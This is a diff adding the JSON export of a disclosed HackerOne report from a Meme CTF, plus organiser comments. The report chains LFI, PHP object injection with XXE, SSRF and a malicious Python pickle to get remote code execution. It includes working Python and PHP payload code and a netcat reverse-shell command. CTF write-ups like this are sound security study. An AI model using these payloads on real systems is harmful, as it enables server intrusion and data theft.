@@ -1,0 +1,358 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-10-22T17:13:10.628Z", 
+    "voters": [
+        "0xacb", 
+        "eveeez", 
+        "mygf", 
+        "japz", 
+        "haythamnaamane", 
+        "spetr0x", 
+        "den1al", 
+        "iheb_hamad", 
+        "jatacheers"
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 415682, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-10-22T16:02:24.933Z", 
+    "vulnerability_information": "**Summary:**\nAfter source code disclosure using a LFI vulnerability and using PHP object injection with XXE I was able to find an internal service at port 1337. Using the SSRF through XXE I sent a HTTP request to this internal service and discovered a python object injection using status parameter, with this vector I was able to get RCE on the server located at 104.248.121.85.\n\n**Description:**\n\n_LFI_\nThe *template* parameter at /api/generate.php is vulnerable to LFI. So I could get all relevant source code from the application using *type* as text. I created a python script to help:\n\n```\nimport requests\nimport sys\n\nurl = 'http://h1-5411.h1ctf.com/api/'\nendpoint = 'generate.php'\n\nheaders = {'Cookie':'PHPSESSID=v6a28uv6ad2e9ivr02hajqao4g'}\npayload = {'template' : '../../../../../../..'+sys.argv[1], 'type' : 'text', 'top-text' : '.', 'bottom-text' :'.'}\n\nr = requests.post(url+endpoint, headers=headers, data=payload)\njson_response = r.json()\n\nfile_url = json_response['meme_path']\nprint file_url\n\nr = requests.get(url+file_url)\nprint r.text\n```\n\nUsing Burp:\n{F352386}\n\nSome files read during my tests:\n1. /etc/passwd\n2. /etc/issue\n3. /etc/resolv.conf\n4. /etc/hosts\n5. /var/log/apt/history.log\n6. App source code\n\n_PHP Object Injection - Deserialization and XXE_\nAfter read the code I discovered two endpoints for a future version, 2.0:\n\nFile: header.php\n```\n<?php\n  $pages = [\n    \"generate.php\" => \"Meme Generator\",\n    \"memes.php\" => \"Your Memes\",\n    // for version 2.0\n    // \"import_memes_2.0.php\" => \"Import Memes\",\n    // \"export_memes_2.0.php\" => \"Export Memes\"\n  ];\n?>\n```\n\nLooking into import_memes_2.0.php and export_memes_2.0.php I found an unserialization call using user input without validation, which is extremely dangerous. So I craft a payload serializing a *ConfigFile* object with XML in *config_raw* attribute, as __toString() method calls parse() witch then calls loadXML with libxml_disable_entity_loader ENABLED. So, we could obtain XXE and SSRF.\n\nUsing PHP to create the payload:\n```\n<?php\nrequire_once('classes.php'); // Same I got using LFI\n\n$t = new ConfigFile('http://localhost/h1-5411/xml2'); \n$x = new Maintenance();\n\n$o = [$t, $x ];\n\necho base64_encode(serialize($o));\n```\n\nPHP Object example (b64 decoded):\n```\na:2:{i:0;O:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:276:\"<?xml version='1.0' encoding='ISO-8859-1'?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/issue' >]>\n<memes><toptext>&xxe;</toptext><bottomtext>A</bottomtext><template>TeMPLaTe123</template><type>XML</type></memes>\n\";}i:1;O:11:\"Maintenance\":0:{}}\n```\n\nFile: xml2\n```\n<?xml version='1.0' encoding='ISO-8859-1'?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/issue' >]>\n<memes><toptext>&xxe;</toptext><bottomtext>A</bottomtext><template>TeMPLaTe123</template><type>XML</type></memes>\n```\n\nThen using the serialized object above (ConfigFile), I uploaded my memepak using /import_memes_2.0.php and got the /etc/issue file base64 encoded as one of my memes.\n\n\n__SSRF__\n\nUsing the above XXE we could manipulate the server to do requests for others internal services, as noted at source code there is a Maintenance service somewhere.\n\nUsing the python exploit attached {F352404}, I could read files and do http/ftp requests. Although I could do a port scan using http/ftp/sftp requests, I was able to find the internal service using a process ID scan using /proc/{ID}/cmdline, which revealed:\n\n```\n/proc\n1\nps-run\n\n4\n/bin/bash/opt/run/ctf-entrypoint\n\n6\nssh-i/app/92df63a566f599a094153febb133b99f87a161b5-oStrictHostKeyChecking=no-f-N-L1337:localhost:1337maintenance@104.248.121.85\n\n8\n/bin/sh/usr/sbin/apache2ctl-DFOREGROUND\n```\n\nSo I found a ssh tunnel to another service at 104.248.121.85. Using the python script above, I started to interact with http://localhost:1337/ :\n {F352398}\n\n__Python Object Injection - Pickle__\n\nUsing the *debug* parameter I realized that *status* parameter should be base64 encoded. After that I could see a pickle base64 encoded as status. My first try was to request a status-update using a malicious pickle as status:\n\nCreating a malicious pickle with a reverse shell:\n```\nimport cPickle\nimport os\nimport sys\nimport base64\n\nDEFAULT_COMMAND = \"nc \u2588\u2588\u2588\u2588\u2588\u2588\u2588 9300 -e /bin/bash\"\n\nCOMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND\n\nclass PickleRce(object):\n    def __reduce__(self):\n        return (os.system,(COMMAND,))\n\nprint base64.b64encode(cPickle.dumps(PickleRce()))\n\n```\nSending the above Pickle I got a connect back from the server.\n\n{F352400}\n\n## Steps To Reproduce:\n\nI created some python scripts to reproduce.\n\n  1. Use {F352403} to read files from the server (LFI)\n  2. Use {F352404} to read files and do requests to internal services. Found http://localhost:1337\n  3. Use {F352406} to create a pickle payload for any OS command. With this payload, use {F352404} to send a request to http://localhost:1337/update-status?debug=1&status={PAYLOAD}\n\n## Impact\n\nCompromise data and servers.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "critical", 
+        "author_type": "User"
+    }, 
+    "title": "Remote Command Execution in a internal server to get the flag file", 
+    "is_member_of_team?": null, 
+    "vote_count": 9, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2018-11-21T16:02:25.018Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "attachments": [
+        {
+            "file_name": "LFI.JPG", 
+            "type": "image/jpeg", 
+            "id": 352386, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/386/918b93ed1c293729925d186d8166819963bd38d4/LFI.JPG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221520Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=064a3bf56e75de85f012ae0a9e2e75f49b953ec461bd923630a64ab91c92e2d4"
+        }, 
+        {
+            "file_name": "Pickle.JPG", 
+            "type": "image/jpeg", 
+            "id": 352398, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/398/537faae2ae5bbc087a8055b0d19c57692b874996/Pickle.JPG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221520Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=81893eed715a52c31e9e05179dee0ab1fdd55520dbf6655c18d202cc522964ae"
+        }, 
+        {
+            "file_name": "ReverseShell.JPG", 
+            "type": "image/jpeg", 
+            "id": 352400, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/400/72044175b0de83ecfffa4880fed2bf1d6cde1a23/ReverseShell.JPG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221520Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ec975c488951f1a292f71533c8b15f0d821c971b0168af415753cfa2a2eedd68"
+        }, 
+        {
+            "file_name": "lfi.py", 
+            "type": "text/plain", 
+            "id": 352403, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/403/0cd48f48459bda8784cd2b4bf00c84cb1eb03bd5/lfi.py?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221520Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cbfbdf0e0d85bb660a3042f6ebd5a8cb65646f432947e882f1783252bfe27df7"
+        }, 
+        {
+            "file_name": "send_meme.py", 
+            "type": "text/x-python", 
+            "id": 352404, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/404/1a52bc0d05fd75aecd56d33d507851864c4c3045/send_meme.py?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221520Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=34bdb74f17dd0c7dccaf20f4ca96d0da2e90550a4229bc5986d26020000c711e"
+        }, 
+        {
+            "file_name": "python_pickle_rce.py", 
+            "type": "text/x-python", 
+            "id": 352406, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/406/71154236bc4a3a15167769b279b7d7cc675584a2/python_pickle_rce.py?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221520Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=77a81ab1ce74ff73575ef146e7c3bf092b52e48c9a4dcd5553e5a7301a649830"
+        }
+    ], 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/415/daacb69b5a706d79649ff1ebfefc01bceeec9c5f/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221520Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=73443630c73abb5eaba60a7b85bc0bee1ee6e31b058fb82922d70aa1038e49c5", 
+                    "type": "image/png", 
+                    "id": 352415, 
+                    "filename": "image.png"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2018-09-28T14:58:16.084Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-28T14:58:16.084Z", 
+            "actor": {
+                "username": "0xacb", 
+                "url": "/0xacb", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/086/176/6b4c526360126ad49e9273323b70d8d27e1e08bc_medium.jpg?1528485899"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "Hey @manoelt,\n\nCongratulations on winning our Meme CTF! You are invited to h1-5411 in Buenos Aires on Saturday, September 29, 2018. Please send us your full name and confirm you can attend to receive full details. **You must be in Buenos Aires to attend**\n\n{F352415}", 
+            "markdown_message": "<p>Hey <a href=\"/manoelt\">@manoelt</a>,</p>\n\n<p>Congratulations on winning our Meme CTF! You are invited to h1-5411 in Buenos Aires on Saturday, September 29, 2018. Please send us your full name and confirm you can attend to receive full details. <strong>You must be in Buenos Aires to attend</strong></p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"image.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/415/daacb69b5a706d79649ff1ebfefc01bceeec9c5f/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221520Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=73443630c73abb5eaba60a7b85bc0bee1ee6e31b058fb82922d70aa1038e49c5\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/415/daacb69b5a706d79649ff1ebfefc01bceeec9c5f/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221520Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=73443630c73abb5eaba60a7b85bc0bee1ee6e31b058fb82922d70aa1038e49c5\" class=\"markdown-inline-image\"></a></p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 3401780, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-28T15:02:07.689Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-28T15:02:07.689Z", 
+            "actor": {
+                "username": "manoelt", 
+                "url": "/manoelt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/008/480/afece2a510d0fa95bb4971d1e93daa36f4abe998_medium.jpg?1541118483"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "@0xacb Ok, thank you. Looking for flights... ", 
+            "markdown_message": "<p><a href=\"/0xacb\">@0xacb</a> Ok, thank you. Looking for flights... </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3401798, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-28T15:11:27.288Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-23T02:56:29.927Z", 
+            "actor": {
+                "username": "manoelt", 
+                "url": "/manoelt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/008/480/afece2a510d0fa95bb4971d1e93daa36f4abe998_medium.jpg?1541118483"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "Full name: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588", 
+            "markdown_message": "<p>Full name: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3401854, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "manoelt", 
+                "url": "/manoelt"
+            }, 
+            "created_at": "2018-09-28T15:19:54.763Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-28T15:19:54.763Z", 
+            "actor": {
+                "username": "0xacb", 
+                "url": "/0xacb", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/086/176/6b4c526360126ad49e9273323b70d8d27e1e08bc_medium.jpg?1528485899"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "Hello @manoelt,\n\nThanks! We already talked via twitter and you confirmed that you can attend the event. We'll send more details soon and invites to the H1-5411 event program and slack. Closing this report as resolved.\nSee you tomorrow!", 
+            "markdown_message": "<p>Hello <a href=\"/manoelt\">@manoelt</a>,</p>\n\n<p>Thanks! We already talked via twitter and you confirmed that you can attend the event. We&#39;ll send more details soon and invites to the H1-5411 event program and slack. Closing this report as resolved.<br>\nSee you tomorrow!</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 3401882, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-28T22:53:59.922Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-28T22:53:59.922Z", 
+            "actor": {
+                "username": "tiffany-h1", 
+                "url": "/tiffany-h1", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
